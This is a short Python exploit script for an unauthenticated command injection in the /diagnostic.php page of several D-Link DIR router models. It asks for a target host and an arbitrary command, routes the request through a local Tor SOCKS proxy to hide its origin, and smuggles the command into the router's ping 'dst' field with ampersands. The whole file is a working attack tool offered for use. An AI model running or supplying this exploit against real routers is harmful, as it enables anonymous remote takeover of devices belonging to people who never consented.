#!/usr/bin/python3

import sys
import urllib.parse
import urllib.request
import socks
from sockshandler import SocksiPyHandler

def main():
	'''
	This module exploits an unauthenticated command injection vulerability
	in the D-LINK DIR-300/600/645/815 web interfaces at /diagnostic.php. This
	vulnerability affects these routers on firmware versions < 1.03, however
	it is also possible on firmware v1.03 with valid credentials for the 
	web interface
	'''

	REMOTE_HOST	= input('Enter host IP: ')
	REMOTE_PORT = input('Enter host port running the HTTP service (usually 80 or 8080): ')
	COMMAND 	= input('Enter the command you want to execute on the router: ')
	url 		= 'http://%s:%s/diagnostic.php' %(REMOTE_HOST, REMOTE_PORT)
	opener 		= urllib.request.build_opener(SocksiPyHandler(socks.SOCKS5, '127.0.0.1', 9050))
	header		= {
		'Host': '%s:%s' %(REMOTE_HOST, REMOTE_PORT),
		'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:16.0) Gecko/20100101',
		'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
		'Connection': 'Close'
	}
	post_args 	= ({
		'act': 'ping',
		'dst': '& %s&' %COMMAND
		})

	enc_args 	= urllib.parse.urlencode(post_args, quote_via=urllib.parse.quote, safe='').encode('utf-8')
	request 	= urllib.request.Request(url, enc_args, header)
	response 	= opener.open(request).read()

if __name__ == '__main__':
	main()